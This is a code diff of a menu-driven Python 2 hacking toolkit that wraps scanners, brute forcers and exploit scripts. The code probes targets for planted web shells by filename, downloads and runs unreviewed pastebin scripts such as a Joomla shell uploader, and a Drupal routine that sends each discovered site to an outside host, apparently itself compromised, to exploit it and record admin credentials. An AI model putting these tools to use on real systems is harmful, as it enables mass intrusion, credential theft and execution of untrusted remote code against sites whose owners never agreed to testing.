@@ -73,7 +73,7 @@ def yesOrNo():
 Variables
 '''
 
-
+toolDir = "tools/"
 directories = ['/uploads/', '/upload/', '/files/', '/resume/', '/resumes/', '/documents/', '/docs/', '/pictures/', '/file/', '/Upload/', '/Uploads/', '/Resume/', '/Resume/', '/UsersFiles/', '/Usersiles/', '/usersFiles/', '/Users_Files/', '/UploadedFiles/',
                '/Uploaded_Files/', '/uploadedfiles/', '/uploadedFiles/', '/hpage/', '/admin/upload/', '/admin/uploads/', '/admin/resume/', '/admin/resumes/', '/admin/pictures/', '/pics/', '/photos/', '/Alumni_Photos/', '/alumni_photos/', '/AlumniPhotos/', '/users/']
 shells = ['wso.php', 'shell.php', 'an.php', 'hacker.php', 'lol.php', 'up.php', 'cp.php', 'upload.php',
@@ -160,7 +160,7 @@ class informationGatheringMenu:
         print("  {1}--Nmap ")
         print("  {2}--Setoolkit")
         print("  {3}--Host To IP")
-        print("  {4}--Scan for Wordpress Admin")
+        print("  {4}--WPScan")
         print("  {5}--CMS scanner")
         print("  {6}--XSStrike")
         print("  {7}--Doork")
@@ -176,7 +176,7 @@ class informationGatheringMenu:
         elif choice2 == "3":
             h2ip()
         elif choice2 == "4":
-            wpue()
+            wpscan()
         elif choice2 == "5":
             cmsscan()
         elif choice2 == "6":
@@ -434,7 +434,7 @@ class nmap:
     '''
 
     def __init__(self):
-        self.installDir = "nmap"
+        self.installDir = toolDir + "nmap"
         self.gitRepo = "https://github.com/nmap/nmap.git"
 
         self.targetPrompt = "   Enter Target IP/Subnet/Range/Host: "
@@ -490,7 +490,7 @@ class nmap:
 
 class setoolkit:
     def __init__(self):
-        self.installDir = "setoolkit"
+        self.installDir = toolDir + "setoolkit"
         self.gitRepo = "https://github.com/trustedsec/social-engineer-toolkit.git"
 
         if not self.installed():
@@ -514,18 +514,86 @@ class setoolkit:
         os.system("setoolkit")
 
 
+class h2ip:
+    def __init__(self):
+        clearScr()
+        host = raw_input("   Enter a Host: ")
+        ip = socket.gethostbyname(host)
+        print("   %s has the IP of %s" % (host, ip))
+        response = raw_input(continuePrompt)
+
+
+class wpscan:
+    wpscanLogo = '''
+    Yb        dP 88""Yb .dP"Y8  dP""b8    db    88b 88
+     Yb  db  dP  88__dP `Ybo." dP   `"   dPYb   88Yb88
+      YbdPYbdP   88"""  o.`Y8b Yb       dP__Yb  88 Y88
+       YP  YP    88     8bodP'  YboodP dP""""Yb 88  Y8
+    '''
+
+    def __init__(self):
+        self.installDir = toolDir + "wpscan"
+        self.gitRepo = "https://github.com/wpscanteam/wpscan.git"
+
+        if not self.installed():
+            self.install()
+        clearScr()
+        print(self.wpscanLogo)
+        target = raw_input("   Enter a Target: ")
+        self.menu(target)
+
+    def installed(self):
+        return (os.path.isdir(self.installDir))
+
+    def install(self):
+        os.system("git clone %s %s" % (self.gitRepo, self.installDir))
+
+    def menu(self, target):
+        clearScr()
+        print(self.wpscanLogo)
+        print("   WPScan for: %s\n" % target)
+        print("   {1}--Username Enumeration [--enumerate u]")
+        print("   {2}--Plugin Enumeration [--enumerate p]")
+        print("   {3}--All Enumeration Tools [--enumerate]\n")
+        print("   {99}-Return to information gathering menu \n")
+        response = raw_input("wpscan~# ")
+        clearScr()
+        logPath = "../../logs/wpscan-" + \
+            strftime("%Y-%m-%d_%H:%M:%S", gmtime()) + ".txt"
+        wpscanOptions = "--no-banner --random-agent --url %s" % target
+        try:
+            if response == "1":
+                os.system(
+                    "ruby tools/wpscan/wpscan.rb %s --enumerate u --log %s" % (wpscanOptions, logPath))
+                response = raw_input(continuePrompt)
+            elif response == "2":
+                os.system(
+                    "ruby tools/wpscan/wpscan.rb %s --enumerate p --log %s" % (wpscanOptions, logPath))
+                response = raw_input(continuePrompt)
+            elif response == "3":
+                os.system(
+                    "ruby tools/wpscan/wpscan.rb %s --enumerate --log %s" % (wpscanOptions, logPath))
+                response = raw_input(continuePrompt)
+            elif response == "99":
+                pass
+            else:
+                self.menu(target)
+        except KeyboardInterrupt:
+            self.menu(target)
+
+
 def doork():
     print("doork is a open-source passive vulnerability auditor tool that automates the process of searching on Google information about specific website based on dorks. ")
     if yesOrNo():
         os.system("pip install beautifulsoup4 && pip install requests")
         os.system("git clone https://github.com/AeonDave/doork")
         clearScr()
-        doorkt = raw_input("Target : ")
+        doorkt = raw_input("Target: ")
         os.system("cd doork && python doork.py -t %s -o log.log" % doorkt)
 
 
 def scanusers():
-    site = raw_input('Enter a website : ')
+    site = raw_input('Enter a website: ')
     try:
         users = site
         if 'http://www.' in users:
@@ -554,18 +622,18 @@ def scanusers():
 
 def brutex():
     clearScr()
-    print("Automatically brute force all services running on a target : Open ports / DNS domains / Usernames / Passwords ")
+    print("Automatically brute force all services running on a target: Open ports / DNS domains / Usernames / Passwords ")
     os.system("git clone https://github.com/1N3/BruteX.git")
     clearScr()
-    brutexchoice = raw_input("Select a Target : ")
+    brutexchoice = raw_input("Select a Target: ")
     os.system("cd BruteX && chmod 777 brutex && ./brutex %s" % brutexchoice)
 
 
 def arachni():
     print("Arachni is a feature-full, modular, high-performance Ruby framework aimed towards helping penetration testers and administrators evaluate the security of web applications")
     clearScr()
-    print("exemple : http://www.target.com/")
-    tara = raw_input("Select a target to scan : ")
+    print("Exemple: http://www.target.com/")
+    tara = raw_input("Select a target to scan: ")
     if yesOrNo():
         os.system("git clone git://github.com/Arachni/arachni.git")
         os.system(
@@ -604,7 +672,7 @@ def gabriel():
     os.system("wget http://pastebin.com/raw/Szg20yUh --output-document=gabriel.py")
     clearScr()
     os.system("python gabriel.py")
-    ftpbypass = raw_input("Enter Target IP and Use Command :")
+    ftpbypass = raw_input("Enter Target IP and Use Command:")
     os.system("python gabriel.py %s" % ftpbypass)
 
 
@@ -612,12 +680,6 @@ def sitechecker():
     os.system("wget http://pastebin.com/raw/Y0cqkjrj --output-document=ch01.py")
     clearScr()
     os.system("python ch01.py")
-
-
-def h2ip():
-    host = raw_input("Select A Host : ")
-    ips = socket.gethostbyname(host)
-    print(ips)
 
 
 def ifinurl():
@@ -633,7 +695,7 @@ def ifinurl():
 def bsqlbf():
     clearScr()
     print("This tool will only work on blind sql injection")
-    cbsq = raw_input("select target : ")
+    cbsq = raw_input("select target: ")
     os.system("wget https://storage.googleapis.com/google-code-archive-downloads/v2/code.google.com/bsqlbf-v2/bsqlbf-v2-7.pl -o bsqlbf.pl")
     os.system("perl bsqlbf.pl -url %s" % cbsq)
     os.system("rm bsqlbf.pl")
@@ -651,7 +713,7 @@ def atscan():
 
 def commix():
     print ("Automated All-in-One OS Command Injection and Exploitation Tool.")
-    print ("usage : python commix.py --help")
+    print ("usage: python commix.py --help")
     if yesOrNo():
         os.system("git clone https://github.com/stasinopoulos/commix.git commix")
         os.system("cd commix")
@@ -664,8 +726,7 @@ def commix():
 def pixiewps():
     print"""Pixiewps is a tool written in C used to bruteforce offline the WPS pin exploiting the low or non-existing entropy of some Access Points, the so-called "pixie dust attack" discovered by Dominique Bongard in summer 2014. It is meant for educational purposes only
     """
-    choicewps = raw_input("Continue ? Y/N : ")
-    if choicewps in yes:
+    if yesOrNo():
         os.system("git clone https://github.com/wiire/pixiewps.git")
         os.system("cd pixiewps & make ")
         os.system("sudo make install")
@@ -682,13 +743,13 @@ def joomlarce():
     os.system("wget http://pastebin.com/raw/EX7Gcbxk --output-document=temp.py")
     clearScr()
     print("if the response is 200 , you will find your shell in Joomla_3.5_Shell.txt")
-    jmtarget = raw_input("Select a targets list :")
+    jmtarget = raw_input("Select a targets list:")
     os.system("python temp.py %s" % jmtarget)
 
 
 def inurl():
     dork = raw_input("select a Dork:")
-    output = raw_input("select a file to save :")
+    output = raw_input("select a file to save:")
     os.system(
         "./inurlbr.php --dork '{0}' -s {1}.txt -q 1,6 -t 1".format(dork, output))
     webHackingMenu.completed("InurlBR")
@@ -709,7 +770,7 @@ def jboss():
     print ("deployed, the script uses its upload and command execution capability to")
     print ("provide an interactive session.")
     print ("")
-    print ("usage : ./e.sh target_ip tcp_port ")
+    print ("usage: ./e.sh target_ip tcp_port ")
     print("Continue: y/n")
     if yesOrNo():
         os.system(
@@ -720,8 +781,8 @@ def jboss():
 
 def wppluginscan():
     Notfound = [404, 401, 400, 403, 406, 301]
-    sitesfile = raw_input("sites file : ")
-    filepath = raw_input("Plugins File : ")
+    sitesfile = raw_input("sites file: ")
+    filepath = raw_input("Plugins File: ")
 
     def scan(site, dir):
         global resp
@@ -730,7 +791,7 @@ def wppluginscan():
             conn.request('HEAD', "/wp-content/plugins/" + dir)
             resp = conn.getresponse().status
         except(), message:
-            print "Cant Connect :", message
+            print "Cant Connect:", message
             pass
 
     def timer():
@@ -747,15 +808,14 @@ def wppluginscan():
             scan(site, plugin)
             if resp not in Notfound:
                 print "+----------------------------------------+"
-                print "| current site :" + site
-                print "| Found Plugin : " + plugin
+                print "| current site:" + site
+                print "| Found Plugin: " + plugin
                 print "| Result:", resp
 
 
 def sqlmap():
-    print ("usage : python sqlmap.py -h")
-    choice8 = raw_input("Continue: y/n :")
-    if choice8 in yes:
+    print ("usage: python sqlmap.py -h")
+    if yesOrNo():
         os.system(
             "git clone https://github.com/sqlmapproject/sqlmap.git sqlmap-dev & ")
     else:
@@ -768,7 +828,7 @@ def grabuploadedlink(url):
             currentcode = urllib.urlopen(url + dir).getcode()
             if currentcode == 200 or currentcode == 403:
                 print "-------------------------"
-                print "  [ + ] Found Directory :  " + str(url + dir) + " [ + ]"
+                print "  [ + ] Found Directory:  " + str(url + dir) + " [ + ]"
                 print "-------------------------"
                 upload.append(url + dir)
     except:
@@ -782,15 +842,15 @@ def grabshell(url):
                 currentcode = urllib.urlopen(upl + shell).getcode()
                 if currentcode == 200:
                     print "-------------------------"
-                    print "  [ ! ] Found Shell :  " + str(upl + shell) + " [ ! ]"
+                    print "  [ ! ] Found Shell:  " + str(upl + shell) + " [ ! ]"
                     print "-------------------------"
     except:
         pass
 
 
 def shelltarget():
-    print("exemple : http://target.com")
-    line = raw_input("target : ")
+    print("Exemple: http://target.com")
+    line = raw_input("target: ")
     line = line.rstrip()
     grabuploadedlink(line)
     grabshell(line)
@@ -809,9 +869,7 @@ def poet():
 def cupp():
     print("cupp is a password list generator ")
     print("Usage: python cupp.py -h")
-    choicecupp = raw_input("Continue: y/n : ")
-
-    if choicecupp in yes:
+    if yesOrNo():
         os.system("git clone https://github.com/Mebus/cupp.git")
         print("file downloaded successfully")
     else:
@@ -820,7 +878,7 @@ def cupp():
 
 def ncrack():
     print("A Ruby interface to Ncrack, Network authentication cracking tool.")
-    print("requires : nmap >= 0.3ALPHA / rprogram ~> 0.3")
+    print("requires: nmap >= 0.3ALPHA / rprogram ~> 0.3")
     print("Continue: y/n")
     if yesOrNo():
         os.system("git clone https://github.com/sophsec/ruby-ncrack.git")
@@ -907,7 +965,7 @@ def check_gravityforms(sites):
 
 
 def gravity():
-    ip = raw_input('Enter IP : ')
+    ip = raw_input('Enter IP: ')
     sites = bing_all_grabber(str(ip))
     gravityforms = check_gravityforms(sites)
     for ss in gravityforms:
@@ -930,20 +988,13 @@ def shellnoob():
 def cmsscan():
     os.system("git clone https://github.com/Dionach/CMSmap.git")
     clearScr()
-    xz = raw_input("select target : ")
+    xz = raw_input("select target: ")
     os.system("cd CMSmap @@ sudo cmsmap.py %s" % xz)
 
 
-def wpue():
-    os.system("git clone https://github.com/wpscanteam/wpscan.git")
-    clearScr()
-    xe = raw_input("Select a Wordpress target : ")
-    os.system("cd wpscan && sudo ruby wpscan.rb --url %s --enumerate u" % xe)
-
-
 def androidhash():
-    key = raw_input("Enter the android hash : ")
-    salt = raw_input("Enter the android salt : ")
+    key = raw_input("Enter the android hash: ")
+    salt = raw_input("Enter the android salt: ")
     os.system("git clone https://github.com/PentesterES/AndroidPINCrack.git")
     os.system(
         "cd AndroidPINCrack && python AndroidPINCrack.py -H %s -s %s" % (key, salt))
@@ -959,7 +1010,7 @@ def bluepot():
 
 def cmsfew():
     print("your target must be Joomla, Mambo, PHP-Nuke, and XOOPS Only ")
-    target = raw_input("Select a target : ")
+    target = raw_input("Select a target: ")
     os.system(
         "wget https://dl.packetstormsecurity.net/UNIX/scanners/cms_few.py.txt -O cms.py")
     os.system("python cms.py %s" % target)
@@ -1028,7 +1079,7 @@ class Fscan:
             elif choice == '8':
                 self.grabSqli()
             elif choice == '9':
-                ran = raw_input(' Enter range of ports, (ex : 1-1000) -> ')
+                ran = raw_input(' Enter range of ports, (ex: 1-1000) -> ')
                 self.portScanner(1, ran)
             elif choice == '10':
                 self.portScanner(2, None)
@@ -1362,7 +1413,7 @@ minu = '''
 
 def drupal():
     '''Drupal Exploit Binger All Websites Of server '''
-    ip = raw_input('1- IP : ')
+    ip = raw_input('1- IP: ')
     page = 1
     while page <= 50:
 
@@ -1385,7 +1436,7 @@ def drupal():
                 resp = urllib2.urlopen(
                     'http://crig-alda.ro/wp-admin/css/index2.php?url=' + site + '&submit=submit')
                 read = resp.read()
-                if "User : HolaKo" in read:
+                if "User: HolaKo" in read:
                     print "Exploit found =>" + site
 
                     print "user:HolaKo\npass:admin"
@@ -1393,7 +1444,7 @@ def drupal():
                     a.write(site + '\n')
                     a.write("user:" + user + "\npass:" + pwd + "\n")
                 else:
-                    print "[-] Expl Not Found :( "
+                    print "[-] Expl Not Found:( "
 
             except Exception as ex:
                 print ex
@@ -1403,7 +1454,7 @@ def drupal():
 
 
 def getdrupal():
-    ip = raw_input('Enter The Ip :  ')
+    ip = raw_input('Enter The Ip:  ')
     page = 1
     sites = list()
     while page <= 50:
@@ -1452,7 +1503,7 @@ def drupallist():
 def maine():
 
     print minu
-    choose = raw_input("choose a number : ")
+    choose = raw_input("choose a number: ")
     while True:
 
         if choose == "1":
@@ -1528,7 +1579,7 @@ def check_joomla(sites):
 
 def wppjmla():
 
-    ipp = raw_input('Enter Target IP : ')
+    ipp = raw_input('Enter Target IP: ')
     sites = bing_all_grabber(str(ipp))
     wordpress = check_wordpress(sites)
     joomla = check_joomla(sites)
@@ -1690,7 +1741,7 @@ def check_wpsymposium(sites):
 
 
 def wpminiscanner():
-    ip = raw_input('Enter IP : ')
+    ip = raw_input('Enter IP: ')
     sites = bing_all_grabber(str(ip))
     wordpress = check_wordpress(sites)
     wpstorethemeremotefileupload = check_wpstorethemeremotefileupload(sites)
